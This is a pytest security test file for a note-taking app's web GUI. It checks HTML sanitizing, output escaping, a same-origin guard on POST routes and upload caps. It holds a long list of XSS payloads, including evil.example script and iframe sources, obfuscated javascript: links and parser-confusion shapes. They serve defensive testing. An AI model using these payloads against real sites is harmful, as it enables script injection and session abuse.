"""The web GUI's untrusted-input boundaries.

Every string this file feeds in can reach the browser without a human ever
having typed it: a note body is whatever document got nucleated, a graph title
is a tool argument the model chose, and a POST can be issued by any page the
user happens to have open. app.js writes the rendered note with innerHTML and
/graph, /map are same-origin documents, so anything that executes here executes
with the GUI's own authority over /chat, /note and /settings.

The sanitizer assertions are deliberately written as "this specific payload is
inert", never as "this list of bad tags is filtered": the allowlist is what
makes the property true, and these are only the witnesses.
"""
from __future__ import annotations

import re
from html.parser import HTMLParser
from pathlib import Path

import pytest

pytest.importorskip("fastapi")
from fastapi.testclient import TestClient  # noqa: E402


@pytest.fixture
def client(tmp_vault, tmp_path, monkeypatch):
    """Fresh module-level session per test, backed by a tmp fs vault."""
    from silica.ui.web import server

    server._reset_session()
    return TestClient(server.app), server


def _render(body: str) -> str:
    """A note body as the drawer would hand it to innerHTML."""
    from silica.ui.web.server import _linkify

    return _linkify(body, None)


def _live_markup(rendered: str) -> list[tuple[str, dict[str, str]]]:
    """Every tag a browser would actually build out of this fragment.

    Substring matching cannot answer the question being asked here: a refused
    tag is *supposed* to show up in the output as `&lt;script&gt;`, so grepping
    for "script" or "onerror" fails on the correct result and passes on nothing.
    Only re-parsing separates markup from prose.
    """
    seen: list[tuple[str, dict[str, str]]] = []

    class _Collect(HTMLParser):
        def handle_starttag(self, tag, attrs):
            seen.append((tag.lower(), {k.lower(): (v or "") for k, v in attrs}))

        handle_startendtag = handle_starttag

    parser = _Collect(convert_charrefs=True)
    parser.feed(rendered)
    parser.close()
    return seen


# Tags that either run code, load a document, or re-point the page. MathML is
# absent on purpose: the math renderer injects `<math>` after sanitizing, so it
# is app markup, not the note's.
_EXECUTABLE_TAGS = frozenset({
    "applet", "audio", "base", "body", "embed", "form", "frame", "frameset",
    "head", "html", "iframe", "link", "meta", "noscript", "object", "portal",
    "script", "source", "style", "svg", "template", "textarea", "title",
    "track", "video", "xmp",
})
# Attributes a browser resolves as a URL, whatever tag they sit on.
_URL_ATTRS = frozenset({
    "action", "background", "data", "formaction", "href", "poster", "src",
    "srcdoc", "srcset", "xlink:href",
})
_SCHEME = re.compile(r"[a-zA-Z][a-zA-Z0-9+.\-]*:")


def _browser_scheme(url: str) -> str:
    """The scheme a browser reads off this URL.

    It strips C0 controls and spaces before parsing and drops tab/CR/LF from
    anywhere inside, which is why `java\tscript:` is still that scheme — so the
    check has to be on the stripped value, not the written one.
    """
    probe = "".join(ch for ch in url if ord(ch) > 0x20)
    m = _SCHEME.match(probe)
    return m.group(0)[:-1].lower() if m else ""


def _assert_inert(rendered: str) -> None:
    """Nothing in this render can run, navigate, or fetch on its own."""
    for tag, attrs in _live_markup(rendered):
        assert tag not in _EXECUTABLE_TAGS, f"<{tag}> is live markup in {rendered!r}"
        if tag == "input":
            # A task checkbox is the only input a note renders; anything else is
            # a focusable, autofocusable surface for a handler.
            assert attrs.get("type", "").lower() == "checkbox", f"live input in {rendered!r}"
        for name, value in attrs.items():
            assert not name.startswith("on"), f"{name}= survived in {rendered!r}"
            assert name != "style", f"style= survived in {rendered!r}"
            if name in _URL_ATTRS:
                scheme = _browser_scheme(value)
                inline_image = tag == "img" and value.strip().lower().startswith("data:image/")
                assert scheme in ("", "http", "https") or inline_image, (
                    f"{name}={value!r} resolves to scheme {scheme!r} in {rendered!r}"
                )


# --- raw-HTML allowlist: what must not survive --------------------------------

_PAYLOADS = {
    "script tag": "<script>alert(1)</script>",
    "script with a src": '<script src="//evil.example/x.js"></script>',
    "img onerror": "<img src=x onerror=alert(1)>",
    "img onerror quoted": '<img src="x" onerror="alert(1)">',
    "javascript href": '<a href="javascript:alert(1)">x</a>',
    "iframe": '<iframe src="https://evil.example"></iframe>',
    "iframe srcdoc": '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
    "div onclick": '<div onclick="alert(1)">x</div>',
    "body onload": "<body onload=alert(1)>",
    "svg onload": "<svg onload=alert(1)></svg>",
    "svg animate": '<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>',
    "details ontoggle": "<details open ontoggle=alert(1)><summary>s</summary></details>",
    "anchor onmouseover": '<a href="#" onmouseover="alert(1)">x</a>',
    "autofocus text input": "<input type=text onfocus=alert(1) autofocus>",
    "style block": '<style>@import "//evil.example/x.css";</style>',
    "inline style declaration": '<div style="background:url(//evil.example)">x</div>',
    "object": '<object data="javascript:alert(1)"></object>',
    "embed": '<embed src="javascript:alert(1)">',
    "base tag": '<base href="https://evil.example/">',
    "meta refresh": '<meta http-equiv="refresh" content="0;url=//evil.example">',
    "link stylesheet": '<link rel="stylesheet" href="//evil.example/x.css">',
    "form action": '<form action="javascript:alert(1)"><button>go</button></form>',
    "html:text data url link": '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    "html:text data url image": '<img src="data:text/html;base64,PHN2Zz4=">',
    "vbscript href": '<a href="vbscript:msgbox(1)">x</a>',
    "file href": '<a href="file:///etc/passwd">x</a>',
    # Obfuscation: the guard is on the parsed value, not on the spelling.
    "case-variant handler": "<img src=x OnErrOr=alert(1)>",
    "tab inside the scheme": '<a href="java\tscript:alert(1)">x</a>',
    "newline inside the scheme": '<a href="java\nscript:alert(1)">x</a>',
    "charref inside the scheme": '<a href="jav&#x09;ascript:alert(1)">x</a>',
    "charref first letter": '<a href="&#106;avascript:alert(1)">x</a>',
    "entity colon": "<a href=javascript&colon;alert(1)>x</a>",
    "leading space and caps": '<a href="  JAVASCRIPT:alert(1)">x</a>',
    "leading NUL": '<a href="\x00javascript:alert(1)">x</a>',
    "newline-separated attributes": "<img\nsrc=x\nonerror=alert(1)>",
    "slash-separated attributes": '<a/href="javascript:alert(1)">x</a>',
    "spaced equals": '<a href = "javascript:alert(1)" >x</a>',
    "comment-smuggled handler": "<!--\n--><img src=x onerror=alert(1)>",
    "quote break-out via alt": '<img src="x" alt="&quot;><script>alert(1)</script>">',
    # Parser-confusion shapes: the payload only becomes a tag if the sanitizer
    # re-emits the foreign-content wrapper, which the allowlist never does.
    "mglyph confusion": "<math><mtext><mglyph><style><img src=x onerror=alert(1)>",
    "noscript title confusion":
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    "xmp confusion": "<xmp><script>alert(1)</script>",
    "template confusion": "<template><script>alert(1)</script></template>",
    "textarea confusion": "<textarea></textarea><script>alert(1)</script>",
    # A formula is converted to MathML *after* the allowlist has run (the
    # allowlist would strip the MathML), and <mtext> is a point where the
    # browser goes back to parsing HTML — so `\text{…}` is a second way in.
    "mathml mtext block": r"$$\text{<img src=x onerror=alert(1)>}$$",
    "mathml mtext inline": r"$\text{<script>alert(1)</script>}$",
    "mathml href": r"$$\href{javascript:alert(1)}{x}$$",
}


@pytest.mark.parametrize("body", _PAYLOADS.values(), ids=list(_PAYLOADS))
def test_raw_html_in_a_note_body_cannot_execute(body):
    _assert_inert(_render(body))


def test_a_refused_tag_is_shown_as_text_rather_than_vanishing():
    """Dropping the markup silently would let an injected instruction hide in a
    note that reads as empty. It is escaped, so the reader sees what was there."""
    out = _render("<iframe src=//evil.example></iframe>")
    assert "&lt;iframe" in out


def test_a_script_body_is_dropped_with_its_tag_in_a_block():
    """<script> is raw-text to the parser: escaping the tag but printing its body
    would dump the payload source into the note as prose."""
    out = _render("<script>\nalert(1)\n</script>")
    assert "<script" not in out.lower()
    assert "alert(1)" not in out


def test_an_unterminated_script_tag_does_not_swallow_the_rest_of_the_note():
    """A raw-text rule with no closing tag runs to EOF, so everything below the
    line is prose, not a script body. Dropping it would let one injected `<script>`
    hide the whole remainder of a note from the reader."""
    out = _render("<script>\nthe rest of the note\nis ordinary prose")
    _assert_inert(out)
    assert "the rest of the note" in out


def test_markdown_native_links_cannot_carry_a_script_scheme():
    """The allowlist only sees raw HTML; `[x](javascript:…)` is a markdown token,
    so the renderer's own link validation is the guard that has to hold there."""
    _assert_inert(_render("[click](javascript:alert(1))"))
    _assert_inert(_render("![x](javascript:alert(1))"))
    _assert_inert(_render("<javascript:alert(1)>"))
    _assert_inert(_render('[click](http://x.io "a\\" onmouseover=alert(1) x=\\"")'))


def test_a_split_html_block_cannot_be_rejoined_into_a_tag():
    """A blank line cuts the raw-HTML block in two, and each half is sanitized
    alone — the halves must not concatenate back into a live tag."""
    for body in (
        '<img src="x\n\n" onerror="alert(1)">',
        "<img src=x\n\nonerror=alert(1)>",
        '<div title="a\n\n"><script>alert(1)</script>',
    ):
        _assert_inert(_render(body))


# --- raw-HTML allowlist: what must survive ------------------------------------


def test_ordinary_obsidian_markup_still_renders():
    out = _render("<details><summary>More</summary>\n\nbody\n\n</details>")
    assert "<details>" in out and "<summary>More</summary>" in out

    assert "line<br>next" in _render("line<br>next")
    assert "line<br>next" in _render("line<br/>next")

    # A note written for GitHub says <b>/<i> rather than **/_; both are inert.
    out = _render("<b>bold</b> <i>it</i> <em>em</em> <strong>strong</strong>")
    assert "<b>bold</b>" in out and "<i>it</i>" in out
    assert "<em>em</em>" in out and "<strong>strong</strong>" in out


def test_a_raw_html_table_keeps_its_structure():
    out = _render(
        "<table><caption>c</caption><thead><tr><th>a</th></tr></thead>"
        "<tbody><tr><td>1</td></tr></tbody></table>"
    )
    for tag in ("<table>", "<caption>", "<thead>", "<tr>", "<th>", "<tbody>", "<td>"):
        assert tag in out


def test_a_relative_raw_img_still_renders_and_still_routes_through_asset():
    """The sanitizer re-serializes the tag from parsed attributes, so it runs
    before the /asset rewrite; if it dropped src the vault image would 404."""
    out = _render('<img src="img/pic.png" alt="p" width="900">')
    assert 'src="/asset?path=img/pic.png"' in out
    assert 'alt="p"' in out and 'width="900"' in out
    # http(s) and an inline picture are the other two src forms a note writes.
    assert 'src="https://x.io/p.png"' in _render('<img src="https://x.io/p.png">')
    assert 'src="data:image/png;base64,AA"' in _render('<img src="data:image/png;base64,AA">')


def test_a_task_list_checkbox_survives_the_allowlist():
    out = _render("- [x] done\n- [ ] todo")
    assert out.count('<input type="checkbox"') == 2
    assert "checked" in out


def test_a_valueless_attribute_does_not_500_the_drawer(client, tmp_vault):
    """`<input type>` gives HTMLParser a None value. /note promises never to
    500 on a note body, and a body is untrusted input."""
    tc, _server = client
    tmp_vault.note("odd.md", "before\n\n<input type>\n\nafter")
    resp = tc.get("/note", params={"path": "odd.md"})
    assert resp.status_code == 200
    assert "&lt;input type&gt;" in resp.json()["html"]


def test_a_note_body_reaches_the_drawer_already_sanitized(client, tmp_vault):
    """End to end: the fixture is the route, not the helper."""
    tc, _server = client
    tmp_vault.note("evil.md", "# Hi\n\n<img src=x onerror=alert(1)>\n\n<script>alert(2)</script>")
    body = tc.get("/note", params={"path": "evil.md"}).json()["html"].lower()
    assert "onerror" not in body and "<script" not in body


# --- /map: the query the caller typed and the error it caused -----------------


def test_map_escapes_an_unknown_note_in_its_message(client):
    tc, _server = client
    payload = "<script>alert(1)</script>"
    resp = tc.get("/map", params={"note": payload})
    assert resp.status_code == 200
    assert "<script>" not in resp.text
    assert "&lt;script&gt;" in resp.text


def test_map_escapes_the_failure_text_that_quotes_the_note(client, monkeypatch):
    """The exception message repeats the caller's input, and /map loads
    same-origin in the explore iframe."""
    from silica.kernel.recall import mindmap

    def exploding_resolver():
        def _resolve(ref):
            raise RuntimeError(f"no index entry for {ref}")

        return _resolve

    monkeypatch.setattr(mindmap, "note_resolver", exploding_resolver)
    tc, _server = client
    resp = tc.get("/map", params={"note": "<img src=x onerror=alert(1)>"})
    assert resp.status_code == 200
    assert "<img" not in resp.text
    assert "&lt;img" in resp.text


# --- same-origin guard on the state-changing routes ---------------------------


def test_a_foreign_origin_cannot_drive_a_state_changing_route(client):
    """No auth means the GUI answers with the browser's ambient authority, and a
    multipart POST crosses origins with no preflight — so any page the user has
    open could otherwise run an agent turn with the write tools."""
    tc, _server = client
    resp = tc.post("/reset", headers={"Origin": "http://evil.example"})
    assert resp.status_code == 403


def test_the_guard_reads_sec_fetch_site_even_without_an_origin(client):
    tc, _server = client
    assert tc.post("/reset", headers={"Sec-Fetch-Site": "cross-site"}).status_code == 403
    # Same site, different port is still a different origin.
    assert tc.post("/reset", headers={"Sec-Fetch-Site": "same-site"}).status_code == 403


def test_a_same_origin_post_and_a_post_with_no_origin_both_work(client):
    tc, _server = client
    # The browser's own request: Origin matches the Host it was served from.
    assert tc.post(
        "/reset",
        headers={"Origin": "http://testserver", "Sec-Fetch-Site": "same-origin"},
    ).status_code == 200
    # curl and the tests send no Origin at all; the guard must not lock them out.
    assert tc.post("/reset").status_code == 200


def test_the_loopback_spellings_are_one_origin(client):
    """The browser echoes whatever the user typed in the address bar, and
    localhost/127.0.0.1 reached the same server on the same interface."""
    tc, _server = client
    ok = tc.post(
        "/reset",
        headers={"Origin": "http://127.0.0.1:8765", "Host": "localhost:8765"},
    )
    assert ok.status_code == 200
    # A port change is a real origin change, loopback or not.
    bad = tc.post(
        "/reset",
        headers={"Origin": "http://127.0.0.1:9999", "Host": "localhost:8765"},
    )
    assert bad.status_code == 403


def test_every_state_changing_route_carries_the_guard():
    """The guard is per-route, so a new POST added without it is a new hole.
    This is the check that catches that, not the per-route cases above."""
    from silica.ui.web import server

    unguarded = []
    for route in server.app.routes:
        methods = getattr(route, "methods", set()) or set()
        if not (methods - {"GET", "HEAD", "OPTIONS"}):
            continue
        deps = [d.call for d in route.dependant.dependencies]
        if server._require_same_origin not in deps:
            unguarded.append(f"{sorted(methods)} {route.path}")
    assert not unguarded, f"state-changing routes without the origin guard: {unguarded}"


# --- graph document title -----------------------------------------------------


def test_render_html_escapes_a_model_chosen_title():
    """The title is a tool argument, and it lands in <title> and in an <h1>:
    a `</title>` closes the first slot and lets whatever follows become markup."""
    from silica.ui.web.graph_view import render_html

    payload = "</title><script>alert(1)</script>"
    out = render_html([{"id": "a", "name": "a"}], [], title=payload)
    assert payload not in out
    # Both slots, not just the first: <title> and the sidebar heading.
    assert out.count("&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;") == 2


def test_render_html_escapes_the_discourse_badge_too():
    from silica.ui.web.graph_view import render_html

    out = render_html([{"id": "a", "name": "a"}], [], discourse="<img src=x onerror=alert(1)>")
    assert "<img src=x onerror=alert(1)>" not in out
    assert "&lt;img src=x onerror=alert(1)&gt;" in out


# --- upload caps --------------------------------------------------------------


def test_the_upload_caps_are_the_documented_ones():
    """Pinned as values: the caps are what stops a drag-drop from filling the
    disk, and loosening one silently is the failure mode."""
    from silica.ui.web import server

    assert server._UPLOAD_MAX_BYTES == 256 * 1024 * 1024
    assert server._UPLOAD_MAX_FILES == 32


def _no_llm(monkeypatch, server):
    """Stub the turn so a cap that stopped holding fails the assertion below
    instead of hanging the suite on a real agent run."""
    def fake_run_agent(messages, model, tool_progress_callback=None, cancel_token=None, **kw):
        messages.append({"role": "assistant", "content": "ok"})
        return "ok"

    monkeypatch.setattr(server, "run_agent", fake_run_agent)


def test_an_oversized_upload_is_refused_and_leaves_no_partial_file(client, monkeypatch):
    """The cap is enforced while streaming, so the refusal lands mid-file — the
    part already written must not stay behind in the vault."""
    from silica.config import CONFIG
    from silica.ui.web import server

    tc, _server = client
    _no_llm(monkeypatch, server)
    monkeypatch.setattr(server, "_UPLOAD_MAX_BYTES", 256)
    monkeypatch.setattr(server, "_UPLOAD_CHUNK", 64)  # several chunks land first

    resp = tc.post(
        "/nucleate",
        files=[("files", ("big.md", b"x" * 4096, "text/markdown"))],
        data={"text": ""},
    )
    assert resp.status_code == 413
    inbox = Path(CONFIG.vault_path) / "Inbox"
    assert not inbox.exists() or list(inbox.iterdir()) == []
    assert server._busy is False  # the refused drop released the turn slot


def test_too_many_files_in_one_drop_are_refused_before_anything_is_written(client, monkeypatch):
    from silica.config import CONFIG
    from silica.ui.web import server

    tc, _server = client
    _no_llm(monkeypatch, server)
    files = [
        ("files", (f"n{i}.md", b"body", "text/markdown"))
        for i in range(server._UPLOAD_MAX_FILES + 1)
    ]
    resp = tc.post("/nucleate", files=files, data={"text": ""})
    assert resp.status_code == 413
    inbox = Path(CONFIG.vault_path) / "Inbox"
    assert not inbox.exists() or list(inbox.iterdir()) == []
    assert server._busy is False
